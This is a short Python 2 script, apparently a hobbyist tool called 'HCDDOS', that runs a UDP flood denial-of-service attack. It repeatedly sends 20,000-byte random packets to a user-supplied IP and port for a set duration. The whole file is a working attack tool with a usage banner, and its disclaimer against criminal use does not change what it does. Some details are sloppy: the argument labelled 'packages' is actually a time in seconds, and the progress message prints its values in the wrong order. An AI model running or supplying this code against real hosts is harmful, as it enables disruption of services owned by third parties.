import time
import socket
import random
import sys
def usage():
    print "\033[1;32m############################################################"
    print "------------------------[\033[1;91mHCDDOS\033[1;32m]------------------------"
    print "------------------------------------------------------------"
    print "    \033[1;91mCommand: " "python2 DDOSnow.py " "<ip> <port> <packages> \033[1;32m  "
    print "                                                           "
    print " \033[1;91mName: HCDDOS  \033[1;32m                                       "
    print " \033[1;91mCreator: HackerProID96        \033[1;32m                                      "
    print " \033[1;91mVersion: 1.0        \033[1;32m.                                      "
    print " \033[1;91mNote: Don't do this for a crime!   "
    print "                      \033[1;91m        \033[1;32m   \033[1;91m  \033[1;32     "
    print "                      \033[1;91m    \033[1;32m      \033[1;91m  \033[1;32m     "
    print "                \033[1;91m<--[HCDDOS ATTACK]-->         \033[1;32m    "
    print "############################################################"
def flood(victim, vport, duration):

    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mStarting \033[1;32m%s \033[1;91mSending Package \033[1;32m%s \033[1;91mOn Port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
